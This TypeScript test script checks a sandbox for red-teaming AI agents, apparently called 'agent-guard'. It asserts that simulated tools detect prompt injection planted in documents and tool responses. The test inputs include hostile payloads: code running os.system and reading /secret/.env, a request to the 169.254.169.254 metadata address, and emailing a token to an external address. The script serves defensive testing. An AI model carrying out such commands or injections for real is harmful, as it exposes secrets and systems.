import path from "node:path";
import type { AgentUnderTest, JsonObject, JsonValue } from "@agent-guard/contracts";
import {
  loadConfigRepository,
  loadTestContexts,
} from "../backend/src/modules/config/loadTestContext";
import { createMcpSandboxForContext } from "../backend/src/modules/sandbox";

const rootDir = process.cwd();
const configsDir = path.resolve(rootDir, "configs");

function assert(condition: boolean, message: string): asserts condition {
  if (!condition) {
    throw new Error(message);
  }
}

async function main(): Promise<void> {
  const agent: AgentUnderTest = {
    schemaVersion: "mvp-1",
    agentId: "agent.demo",
    name: "Demo Agent",
    adapterType: "mock",
  };

  const repository = await loadConfigRepository(configsDir);
  assert(repository.tools.length >= 7, "loads expanded tools.json");
  assert(repository.resources.length >= 8, "loads expanded resources.json");
  assert(repository.riskRules.length >= 12, "loads expanded risk_rules.json");
  assert(repository.testCases.length >= 7, "loads expanded test_cases.json");
  assert(repository.redTeamScenarioSet.scenarios.length >= 5, "loads red_team_scenarios.json");
  assert(repository.policyTemplates.length >= 10, "loads supervision_policy_templates.json");

  const { contexts, testOracles } = await loadTestContexts(configsDir, agent);
  assert(contexts.length === repository.testCases.filter((item) => item.enabled).length, "builds one TestContext per enabled test case");
  assert(testOracles.length === repository.testOracles.length, "returns TestOracle[] for offline verification");

  for (const context of contexts) {
    assert(context.schemaVersion === "mvp-1", "context schemaVersion");
    assert(context.configVersion === "mvp-1", "context configVersion");
    assert(context.agent.agentId === agent.agentId, "context agent");
    assert(context.riskRules.length === repository.riskRules.length, "context riskRules");
    assert(!("expectedOutcome" in context), "TestContext must not include expectedOutcome");
    assert(!("testOracles" in context), "TestContext must not include TestOracle[]");
  }

  const resourceContext = contexts.find(
    (context) => context.caseId === "case.resource_injection",
  );
  assert(resourceContext !== undefined, "resource injection context exists");
  const resourceSandbox = createMcpSandboxForContext(resourceContext);
  const maliciousResource = await resourceSandbox.readResource(
    "resource.malicious_doc_01",
  );
  assert(maliciousResource.authorized, "allowed use case authorizes malicious doc");
  assert(maliciousResource.containsInjection, "malicious doc carries injection flag");

  const secretResource = await resourceSandbox.readResource("resource.secret_env");
  assert(!secretResource.authorized, "secret resource remains unauthorized");
  assert(secretResource.sensitivity === "secret", "secret sensitivity is preserved");

  const toolResponseContext = contexts.find(
    (context) => context.caseId === "case.tool_response_injection",
  );
  assert(toolResponseContext !== undefined, "tool response context exists");
  const toolResponseSandbox = createMcpSandboxForContext(toolResponseContext);
  const responsePlan = toolResponseContext.testCase.toolResponsePlan[0];
  assert(responsePlan !== undefined, "tool response plan exists");

  const resolved = await toolResponseSandbox.resolveToolResponse(responsePlan, {
    path: "/docs/public_policy.md",
  });
  assert(resolved?.responseTemplateId === "response.inject_send_request", "resolves response template");

  const firstToolResult = await toolResponseSandbox.executeTool("tool.read_file", {
    path: "/docs/public_policy.md",
  });
  assert(firstToolResult.containsInjection, "first tool call applies first_call injection");
  assert(
    firstToolResult.riskTagIds.includes("tag.tool_response_injection"),
    "tool response risk tag is attached",
  );

  const secondToolResult = await toolResponseSandbox.executeTool("tool.read_file", {
    path: "/docs/public_policy.md",
  });
  assert(!secondToolResult.containsInjection, "second tool call does not repeat first_call injection");

  const prompt = await toolResponseSandbox.loadPrompt("prompt.malicious_user_01");
  assert(prompt.attackEntryType === "malicious_user_prompt", "prompt attack entry is preserved");

  const scenarioCaseIds = new Set(
    repository.redTeamScenarioSet.scenarios.flatMap((scenario) => scenario.caseIds),
  );
  for (const testCase of repository.testCases) {
    assert(scenarioCaseIds.has(testCase.caseId), `test case ${testCase.caseId} belongs to a red team scenario`);
  }

  const policyTemplateIds = new Set(
    repository.policyTemplates.map((template) => template.policyTemplateId),
  );
  for (const scenario of repository.redTeamScenarioSet.scenarios) {
    for (const policyTemplateId of scenario.recommendedPolicyTemplateIds) {
      assert(
        policyTemplateIds.has(policyTemplateId),
        `scenario ${scenario.scenarioId} references known policy template ${policyTemplateId}`,
      );
    }
  }

  const toolAbuseContext = contexts.find(
    (context) => context.caseId === "case.tool_abuse_path_traversal",
  );
  assert(toolAbuseContext !== undefined, "tool abuse context exists");
  const toolAbuseSandbox = createMcpSandboxForContext(toolAbuseContext);

  const writeResult = await toolAbuseSandbox.executeTool("tool.write_file", {
    path: "/secret/.env",
    content: "token=demo-secret-token",
  });
  const writePayload = asJsonObject(writeResult.result, "write_file result");
  assert(writePayload.fileSystemSideEffect === "not_performed", "write_file is simulated");
  assert(writePayload.wouldOverwriteSensitivePath === true, "write_file detects sensitive path");
  assert(writePayload.containsSensitiveContent === true, "write_file detects sensitive content");

  const apiResult = await toolAbuseSandbox.executeTool("tool.call_api", {
    url: "http://169.254.169.254/latest/meta-data",
    method: "GET",
    body: "token=demo-secret-token",
  });
  const apiPayload = asJsonObject(apiResult.result, "call_api result");
  assert(apiPayload.networkSideEffect === "not_performed", "call_api is simulated");
  assert(apiPayload.isInternalUrl === true, "call_api detects internal URL");
  assert(apiPayload.containsSensitiveContent === true, "call_api detects sensitive body");

  const codeResult = await toolAbuseSandbox.executeTool("tool.execute_code", {
    language: "python",
    code: "import os; os.system('id'); open('/secret/.env').read()",
  });
  const codePayload = asJsonObject(codeResult.result, "execute_code result");
  assert(codePayload.commandSideEffect === "not_performed", "execute_code is simulated");
  assert(codePayload.blockedBySandbox === true, "execute_code is blocked by sandbox");
  assert(
    Array.isArray(codePayload.dangerousPatterns) &&
      codePayload.dangerousPatterns.includes("shell_execution") &&
      codePayload.dangerousPatterns.includes("sensitive_file_read"),
    "execute_code detects dangerous patterns",
  );

  const exfilContext = contexts.find(
    (context) => context.caseId === "case.data_exfiltration_email",
  );
  assert(exfilContext !== undefined, "data exfiltration email context exists");
  const exfilSandbox = createMcpSandboxForContext(exfilContext);
  const emailResult = await exfilSandbox.executeTool("tool.send_email", {
    to: ["auditor@external.example.invalid"],
    subject: "audit",
    body: "token=demo-secret-token",
  });
  const emailPayload = asJsonObject(emailResult.result, "send_email result");
  assert(emailPayload.emailSideEffect === "not_performed", "send_email is simulated");
  assert(emailPayload.containsSensitiveContent === true, "send_email detects sensitive body");
  assert(
    Array.isArray(emailPayload.externalRecipients) &&
      emailPayload.externalRecipients.includes("auditor@external.example.invalid"),
    "send_email detects external recipient",
  );

  const authContext = contexts.find(
    (context) => context.caseId === "case.authorization_bypass_admin_api",
  );
  assert(authContext !== undefined, "authorization bypass context exists");
  const authSandbox = createMcpSandboxForContext(authContext);
  const dbResult = await authSandbox.executeTool("tool.query_database", {
    query: "select * from users",
    scope: "admin",
  });
  const dbPayload = asJsonObject(dbResult.result, "query_database result");
  assert(dbPayload.databaseSideEffect === "not_performed", "query_database is simulated");
  assert(dbPayload.crossUserAccessRequested === true, "query_database detects cross-user access");

  console.log("PASS: A line config + sandbox verification");
}

function asJsonObject(value: JsonValue, label: string): JsonObject {
  if (typeof value !== "object" || value === null || Array.isArray(value)) {
    throw new Error(`${label} must be a JSON object.`);
  }
  return value;
}

main().catch((error) => {
  console.error("FAIL:", error instanceof Error ? error.message : String(error));
  process.exit(1);
});
